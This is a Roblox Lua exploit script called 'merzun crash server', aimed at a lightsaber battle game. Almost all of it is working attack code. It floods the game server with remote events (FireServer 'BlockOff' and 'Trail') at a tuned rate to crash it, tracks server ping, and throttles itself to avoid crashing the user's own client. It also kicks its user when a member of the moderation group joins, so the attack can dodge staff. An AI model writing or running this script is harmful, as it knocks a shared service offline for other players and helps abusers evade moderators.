-- merzun crash server
-- entropy rememberance

-- debug values --

local crashspeed = 200 -- after 200 it peaks, so try tweaking amountofrepeat :P
local amountofrepeat = 10
local orgamount = amountofrepeat
local useanticrash = true
local usediagnostic = true
local kickonstaffjoin = true
local useteleport = false -- experimental

-- dont change below --

-- FUNCTIONS

local LSBGmodGroup = 14702260
local LSBGPlace = 4061596946
local sabers = {}
    game.Players.PlayerAdded:Connect(function(playerjoin)
        if playerjoin:IsInGroup(LSBGmodGroup) then
            if kickonstaffjoin == true then
            game.Players.LocalPlayer:Kick("\nStaff Joined\nStaff Name: "..playerjoin.Name.."\nKicked by the Merzun Servercrash")
            else
                rconsoleprint("Staff joined: "..playerjoin.Name.."\n")
            end
        end
end)

local function delta(func, rr)
    rr = (1000 / rr) * 0.001;
    local acc = 0;
    game:GetService("RunService").Heartbeat:Connect(function(Delta)
        acc = acc + Delta;
        if acc >= rr then
            acc = acc - rr;
            func();
        end;
    end);
    return {
        r = function(int)
            rr = (1000/int) * 0.001;
        end;
    };
end;


function checksabers(player,chare)
    chare = player.Character or player.CharacterAdded:Wait()
    chare.Humanoid:UnequipTools()
sabers = player.Backpack:GetChildren()
for i,v in pairs(sabers) do
    if v.ClassName ~= "Tool" then
    table.remove(sabers,i)
    end
end
for i,v in pairs(sabers) do
rconsoleprint(i..": "..v.Name.."\n")
end
end


--- initialize

local TeleportService = game:GetService("TeleportService")
local LocalPlayer = game.Players.LocalPlayer
local chare = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
if chare.Humanoid.Health < 1 then
repeat task.wait() until chare.Humanoid.Health > 1
end
if crashspeed > 200 then
crashspeed = 200
end
rconsoleprint("CrashSpeed loaded is: "..crashspeed.."\n")
rconsoleprint("Sabers loaded are:\n")
checksabers(LocalPlayer)
wait(4)
local orgtime = os.time()
local used = false
local wai = 150
local count = 0
delta(function()
    e = 0
    chare = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    workspace.CurrentCamera.CFrame = chare.HumanoidRootPart.CFrame
    if math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) > 150000 then
    amountofrepeat = 4
   --[[ if useteleport == true then
    TeleportService:Teleport(LSBGPlace,LocalPlayer)
    repeat task.wait() until math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) < 175000
    rconsoleprint("Teleport completed.")
    end]]
    else
        amountofrepeat = orgamount
    end
    repeat
    game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(sabers[math.random(1, #sabers)])
    sabers[math.random(1, #sabers)].Action:FireServer("BlockOff")
    sabers[math.random(1, #sabers)].Action:FireServer("Trail")
    e = e + 1
    count = count + 1
    until e == amountofrepeat
    if orgtime + 1 < os.time() and used == false and usediagnostic == true then
    rconsoleprint('SOO/Speed of Operations: '..(count).."\n")
    rconsoleprint('Ping of server is: '..math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()).."ms\n")
    count = 0
    orgtime = os.time()
    used = false
    end
   wai = wai - 1
  if wai <= 0 then
        if useanticrash == true then
    wait(math.random(2.4,3))
    wai = 150
    end
    end
end, crashspeed)
